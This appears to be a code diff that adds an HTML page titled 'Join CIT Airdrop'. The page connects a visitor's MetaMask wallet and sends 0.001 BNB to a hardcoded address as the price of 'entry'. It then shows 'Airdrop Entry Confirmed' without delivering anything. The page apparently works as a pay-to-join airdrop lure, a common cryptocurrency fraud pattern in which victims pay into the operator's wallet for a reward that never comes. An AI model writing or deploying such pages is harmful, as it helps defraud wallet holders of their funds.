@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Join CIT Airdrop</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+</head>
+<body style="text-align:center; font-family:sans-serif; padding:50px;">
+  <h2>Join CIT Airdrop 🚀</h2>
+  <p>Send 0.001 BNB (~$0.60) to participate</p>
+  <button onclick="connectWallet()">Connect Wallet</button>
+  <br><br>
+  <button onclick="sendBNB()">Send 0.001 BNB</button>
+
+  <p id="status"></p>
+
+  <script>
+    const receiver = "0x6Ec8Ad112E0109Eff1b66678E59767F99daf9d8f";
+
+    let web3;
+
+    async function connectWallet() {
+      if (window.ethereum) {
+        web3 = new Web3(window.ethereum);
+        try {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          document.getElementById("status").innerText = "Wallet Connected!";
+        } catch (error) {
+          document.getElementById("status").innerText = "Connection failed!";
+        }
+      } else {
+        alert("Please install MetaMask!");
+      }
+    }
+
+    async function sendBNB() {
+      const accounts = await web3.eth.getAccounts();
+      const tx = {
+        from: accounts[0],
+        to: receiver,
+        value: web3.utils.toWei("0.001", "ether")
+      };
+
+      web3.eth.sendTransaction(tx)
+        .on("transactionHash", function(hash) {
+          document.getElementById("status").innerText = "Transaction Sent! Hash: " + hash;
+        })
+        .on("receipt", function(receipt) {
+          document.getElementById("status").innerText = "Airdrop Entry Confirmed ✅";
+        })
+        .on("error", function(error) {
+          document.getElementById("status").innerText = "Transaction Failed!";
+        });
+    }
+  </script>
+</body>
+</html>
